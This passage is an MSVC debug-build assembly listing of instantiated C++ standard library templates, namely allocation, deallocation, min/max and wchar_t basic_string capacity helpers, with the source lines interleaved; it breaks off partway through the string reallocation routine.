;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 4
_Max_possible$1 = 40
_Count$ = 288
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  0001f	c6 45 04 01	 mov	 BYTE PTR _Overflow_is_possible$[rbp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  00023	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0002d	48 89 45 28	 mov	 QWORD PTR _Max_possible$1[rbp], rax

; 73   :         if (_Count > _Max_possible) {

  00031	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0003b	48 39 85 20 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00042	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  00044	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00050	48 d1 e0	 shl	 rax, 1
$LN3@Get_size_o:

; 79   : }

  00053	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001f	48 81 bd e0 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0002c	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00033	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00038	eb 1a		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0003a	48 83 bd e0 00
	00 00 00	 cmp	 QWORD PTR _Bytes$[rbp], 0
  00042	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00044	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  0004b	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00050	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00052	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00054	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Count$ = 232
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0002b	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  0002e	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00035	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@min
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@min
$LN3@min:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@min:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 101  : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Fancy_ptr$ = 8
_Al$ = 256
_Capacity$ = 264
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 ff c0	 inc	 rax
  00031	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00038	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  0003b	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Capacity$[rbp]
  00042	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00049	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0004e	48 89 45 08	 mov	 QWORD PTR _Fancy_ptr$[rbp], rax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00052	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00059	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0005c	48 ff c8	 dec	 rax
  0005f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00066	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2634 :         return _Fancy_ptr;

  00069	48 8b 45 08	 mov	 rax, QWORD PTR _Fancy_ptr$[rbp]

; 2635 :     }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 224
_Bytes$ = 232
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00024	48 81 bd e8 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002f	72 13		 jb	 SHORT $LN2@Deallocate

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

  00031	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR _Bytes$[rbp]
  00038	48 8d 8d e0 00
	00 00		 lea	 rcx, QWORD PTR _Ptr$[rbp]
  0003f	e8 00 00 00 00	 call	 ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
$LN2@Deallocate:

; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  00044	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Bytes$[rbp]
  0004b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00052	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete

; 269  :     }
; 270  : }

  00057	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005e	5f		 pop	 rdi
  0005f	5d		 pop	 rbp
  00060	c3		 ret	 0
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@max
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@max
$LN3@max:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@max:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 78   : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$ = 224
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
_TEXT	SEGMENT
_Old_capacity$ = 8
_New_capacity$ = 40
_Al$ = 72
_New_ptr$ = 104
__$ArrayPad$ = 312
this$ = 352
_New_size$ = 360
_Fn$ = 368
<_Args_0>$ = 376
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>, COMDAT

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

$LN6:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 88 44 24 18	 mov	 BYTE PTR [rsp+24], r8b
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 22 00 00 00	 mov	 ecx, 34			; 00000022H
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 88
	01 00 00	 mov	 rcx, QWORD PTR [rsp+392]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 38 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  00058	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00064	48 39 85 68 01
	00 00		 cmp	 QWORD PTR _New_size$[rbp], rax
  0006b	76 05		 jbe	 SHORT $LN2@Reallocate

